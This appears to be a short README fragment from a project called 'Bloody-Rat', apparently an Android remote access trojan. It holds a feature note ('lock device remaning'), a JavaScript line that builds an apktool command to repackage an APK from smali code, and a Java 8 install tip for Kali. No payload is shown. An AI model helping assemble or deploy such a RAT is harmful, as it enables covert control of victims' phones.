# Bloody-Rat
lock device remaning


exports.buildCommand = 'java -jar "' + exports.apkTool + '" b "' + exports.smaliPath + '" --use-aapt2 "' + '" -o "' + exports.apkBuildPath + '"';

if os is kali then we need to add repo install java 8 or else sudo apt install openjdk-8-jre-headless
